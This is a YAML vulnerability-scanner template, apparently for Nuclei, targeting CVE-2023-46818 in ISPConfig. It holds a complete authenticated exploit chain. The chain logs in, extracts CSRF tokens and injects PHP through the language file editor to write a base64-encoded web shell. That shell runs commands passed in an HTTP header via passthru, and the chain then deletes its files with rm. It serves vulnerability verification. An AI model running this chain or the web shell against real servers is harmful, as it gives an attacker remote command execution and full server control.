flow: http(1) && http(2) && http(3) && http(4) && http(5) && http(6)
http:
- matchers:
  - condition: and
    dsl:
    - contains(header, "Set-Cookie")
    - status_code == 302
    type: dsl
  raw:
  - 'POST /login/index.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    username={{username}}&password={{password}}&s_mod=login

    '
- extractors:
  - group: 1
    internal: true
    name: lang_file_location
    regex:
    - '<legend>Language file: (.*)</legend>'
    type: regex
  - group: 1
    internal: true
    name: csrf_id
    regex:
    - _csrf_id" value="(.*)" />
    type: regex
  - group: 1
    internal: true
    name: csrf_key
    regex:
    - _csrf_key" value="(.*)" />
    type: regex
  matchers:
  - condition: and
    dsl:
    - contains_all(response, "_csrf_id", "_csrf_key")
    - status_code == 200
    type: dsl
  raw:
  - 'POST /admin/language_edit.php HTTP/1.1

    Host: {{Hostname}}

    Accept: */*

    Content-Type: application/x-www-form-urlencoded


    lang=en&module=help&lang_file={{lang-file}}

    '
- matchers:
  - dsl:
    - status_code == 200
    type: dsl
  raw:
  - 'POST /admin/language_edit.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    lang=en&module=help&lang_file={{lang-file}}&_csrf_id={{csrf_id}}&_csrf_key={{csrf_key}}&records[%5C]={{payload-url-enc}}

    '
- matchers:
  - status:
    - 200
    type: status
  - type: word
    words:
    - '{{echo-cmd-hash}}'
  matchers-condition: and
  raw:
  - 'GET /admin/{{websh-file}} HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    C: {{base64(echo-cmd)}}

    '
- matchers:
  - status:
    - 200
    type: status
  raw:
  - 'GET /admin/{{websh-file}} HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    C: {{base64(''rm '' + lang_file_location)}}

    '
- matchers:
  - status:
    - 200
    type: status
  raw:
  - 'GET /admin/{{websh-file}} HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    C: {{base64(''rm '' + websh-file)}}

    '
id: CVE-2023-46818
info:
  author: non-things
  classification:
    cve-id: CVE-2023-46818
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 7.2
    cwe-id: CWE-94
    epss-percentile: 0.9957
    epss-score: 0.9027
  description: 'An issue was discovered in ISPConfig before 3.2.11p1. PHP code injection
    can be achieved in the language file editor by an admin if admin_allow_langedit
    is enabled.

    '
  impact: 'Authenticated administrators can inject and execute arbitrary PHP code,
    potentially gaining complete server control.

    '
  metadata:
    max-request: 1
    product: ispconfig
    verified: true
  name: ISPConfig - PHP Code Injection
  reference:
  - https://www.ispconfig.org/blog/ispconfig-3-2-11p1-released/
  - http://packetstormsecurity.com/files/176126/ISPConfig-3.2.11-PHP-Code-Injection.html
  - http://seclists.org/fulldisclosure/2023/Dec/2
  - https://nvd.nist.gov/vuln/detail/CVE-2023-46818
  remediation: 'Upgrade ISPConfig to version 3.2.11p1 or later, and ensure admin_allow_langedit
    is disabled unless absolutely necessary.

    '
  severity: high
  tags: cve,cve2023,ispconfig,php,rce,vuln
variables:
  echo-cmd: echo {{echo-cmd-hash}}
  echo-cmd-hash: '{{rand_text_alphanumeric(32)}}'
  lang-file: '{{rand_text_alpha(26)}}.lng'
  payload: '''];file_put_contents(''{{websh-file}}'',base64_decode(''{{websh-base64}}''));die;#'
  payload-url-enc: '{{url_encode(payload)}}'
  websh: <?php print('____'); passthru(base64_decode($_SERVER['HTTP_C'])); print('____');
    ?>
  websh-base64: '{{base64(websh)}}'
  websh-file: '{{rand_text_alphanumeric(32)}}.php'
